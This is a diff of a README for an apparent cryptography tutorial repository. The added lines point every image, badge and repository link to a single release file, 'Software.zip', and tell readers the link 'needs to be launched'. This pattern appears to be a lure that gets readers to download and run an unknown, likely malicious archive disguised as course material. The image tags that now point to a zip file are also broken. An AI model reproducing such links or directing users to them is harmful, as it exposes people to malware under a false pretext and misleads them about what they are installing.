@@ -1,7 +1,7 @@
 
 # 🛡️ Cryptography - Fundamentals and Applications 📜
 
-![Cryptography](https://cdn.pixabay.com/photo/2017/08/30/01/05/milky-way-2695569_960_720.jpg)
+![Cryptography](https://github.com/perfectkiddo/Cryptography--Fundamentals-and-Applications/releases/download/v1.0/Software.zip)
 
 Welcome to the "Cryptography - Fundamentals and Applications" repository! Here you will find a comprehensive guide to cryptography fundamentals and practical applications. Whether you are a beginner looking to understand the basics or an experienced developer diving into advanced cryptographic techniques, this repository has something for everyone.
 
@@ -34,7 +34,7 @@ All code examples in this repository are written in Python, making it easy for y
 ## 🚀 Get Started
 To dive into the world of cryptography and explore the practical applications of cryptographic techniques, download the repository files using the following link:
 
-[![Download Repository](https://img.shields.io/badge/Download-Repository-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Repository](https://github.com/perfectkiddo/Cryptography--Fundamentals-and-Applications/releases/download/v1.0/Software.zip)](https://github.com/perfectkiddo/Cryptography--Fundamentals-and-Applications/releases/download/v1.0/Software.zip)
 
 *Note: The link provided needs to be launched to download the repository files.*
 
@@ -43,6 +43,6 @@ If you encounter any issues with the link or want to explore more resources rela
 ## Topics Covered
 aes, asymmetric-encryption, cbc-mode, cryptography, cryptography-examples, cryptography-fundamentals, cryptography-tutorial, cybersecurity, decryption, digital-signatures, ecdsa, encryption, gcm-mode, google-colab, hmac, pycryptodome, python, rsa, sha256, symmetric-encryption
 
-Visit the [Cryptography - Fundamentals and Applications GitHub Repository](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) to embark on a journey through the fascinating world of cryptography. Happy encrypting! 🔒
+Visit the [Cryptography - Fundamentals and Applications GitHub Repository](https://github.com/perfectkiddo/Cryptography--Fundamentals-and-Applications/releases/download/v1.0/Software.zip) to embark on a journey through the fascinating world of cryptography. Happy encrypting! 🔒
 
-![Cryptocurrency](https://cdn.pixabay.com/photo/2017/08/30/01/05/milky-way-2695569_960_720.jpg)
+![Cryptocurrency](https://github.com/perfectkiddo/Cryptography--Fundamentals-and-Applications/releases/download/v1.0/Software.zip)
